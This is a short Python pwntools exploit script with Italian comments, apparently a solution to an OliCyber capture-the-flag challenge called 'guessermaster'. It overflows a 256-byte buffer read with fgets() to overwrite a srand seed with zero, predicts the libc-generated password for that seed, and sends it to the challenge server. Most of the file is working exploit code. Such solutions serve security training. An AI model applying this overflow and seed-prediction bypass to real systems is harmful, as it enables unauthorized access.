#Obiettivo: fgets() prende 512 bytes nonstante il vettore s abbiamo come dimensione massima 256 bytes, possiamo sfruttare questa vulnerabilità 
#per sovrascrivere il seed. In questo modo possiamo mettere la password che verrà confrontata con la password che gli abbiamo fatto calcolare (le 2 password sono ugauli e la condizione è verificata)  
from pwn import *
import random
from ctypes import CDLL
from Crypto.Util.number import bytes_to_long
libc = CDLL("libc.so.6")

def generate_password(seed):
    password = []
    libc.srand(seed)
        
    for i in range(255):   # Da 0 a 254
        password.append(libc.rand() % 25 + 65)  
    
    password_str = ''.join(chr(x) for x in password)  # Converte i numeri in caratteri
    return password_str

def main():
    conn = remote('guessermaster.challs.olicyber.it', 35006)
    
    response = conn.recvuntil(b":")  #input:
    print(response)

    payload = generate_password(0).encode() + p64(0) 
    print(f'payload: {payload}')
    conn.sendline(payload)

    conn.interactive()
if __name__ == "__main__":
    main()
